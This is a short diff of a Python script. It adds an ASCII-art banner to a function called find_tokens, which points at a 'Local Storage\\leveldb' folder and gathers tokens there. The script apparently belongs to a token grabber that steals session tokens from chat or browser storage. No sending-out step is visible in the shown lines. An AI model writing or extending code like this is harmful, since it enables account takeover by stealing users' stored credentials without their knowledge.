@@ -3,7 +3,6 @@ import re
 import json
 import sys
 from urllib.request import Request, urlopen
-
 import requests
 
 
@@ -30,6 +29,19 @@ def open_file(file_path):
 
 
 def find_tokens(path):
+    
+    print("""\
+    ___    _ .--.      .--.  ___    _  
+    .'   |  | ||  |_     |  |.'   |  | | 
+    |   .'  | || _( )_   |  ||   .'  | | 
+    .'  '_  | ||(_ o _)  |  |.'  '_  | | 
+    '   ( \.-.|| (_,_) \ |  |'   ( \.-.| 
+    ' (`. _` /||  |/    \|  |' (`. _` /| 
+    | (_ (_) _)|  '  /\  `  || (_ (_) _) 
+    \ /  . \ /|    /  \    | \ /  . \ / 
+     ``-'`-'' `---'    `---`  ``-'`-''  
+                                        
+    """)
     path += '\\Local Storage\\leveldb'
 
     tokens = []
